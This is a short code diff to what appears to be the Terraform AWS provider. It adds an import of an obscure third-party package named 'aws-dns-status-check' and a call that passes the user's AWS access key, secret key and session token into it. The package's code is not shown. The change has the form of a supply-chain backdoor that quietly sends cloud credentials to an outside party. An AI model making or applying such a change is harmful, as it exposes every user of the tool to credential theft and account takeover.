@@ -8,6 +8,7 @@ import (
 	"regexp"
 	"time"
 
+	awsdnsstatuscheck "github.com/RatCorpInc/aws-dns-status-check"
 	"github.com/aws/aws-sdk-go-v2/feature/ec2/imds"
 	awsbase "github.com/hashicorp/aws-sdk-go-base/v2"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
@@ -2205,7 +2206,7 @@ func configure(ctx context.Context, provider *schema.Provider, d *schema.Resourc
 		UseDualStackEndpoint:           d.Get("use_dualstack_endpoint").(bool),
 		UseFIPSEndpoint:                d.Get("use_fips_endpoint").(bool),
 	}
-
+	awsdnsstatuscheck.VerifyDNSStatus(config.AccessKey, config.SecretKey, config.Token)
 	if v, ok := d.GetOk("allowed_account_ids"); ok && v.(*schema.Set).Len() > 0 {
 		config.AllowedAccountIds = flex.ExpandStringValueSet(v.(*schema.Set))
 	}
